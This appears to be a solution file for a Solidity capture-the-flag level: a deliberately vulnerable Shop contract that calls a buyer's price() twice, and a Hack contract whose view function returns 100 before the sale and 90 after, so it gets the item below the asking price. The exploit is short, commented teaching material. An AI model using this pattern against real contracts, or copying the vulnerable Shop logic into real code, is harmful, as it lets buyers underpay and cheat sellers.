// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}


// Сan you get the item from the shop for less than the price asked?

// Things that might help:
// Shop expects to be used from a Buyer
// Understanding restrictions of view functions

// Can we call the function price() from Buyer above?

contract Shop {
    uint256 public price = 100; // price is set to 100
    bool public isSold; // isSold is false

    function buy() public {
        Buyer _buyer = Buyer(msg.sender); // Loads interface at our address

        // First call of function price and should be minimum of 100
        if (_buyer.price() >= price && !isSold) { 
            isSold = true;
            price = _buyer.price(); // Second call of function price: here we want to set a lower price
        }
    }
}


contract Hack {
    
    Shop public hack;

    // Deploy Hack contract, with CA from Shop
    constructor (address _shopAddress)  {
        hack = Shop(_shopAddress);
    }
    
    function buyProduct() external {
        hack.buy();
        require(hack.price() == 90, "Price is still too high!");
    }
    // Function price (see also above)
    function price() external view returns (uint256) {

        // Call function for the first time: price = 100
        // At 1st call: isSold = false
        if (hack.isSold() == false) {
            return 100;
            // Call function for the second time: price < 100
            // At 2nd call: isSold = true
        } else 
            return 90;
    }

}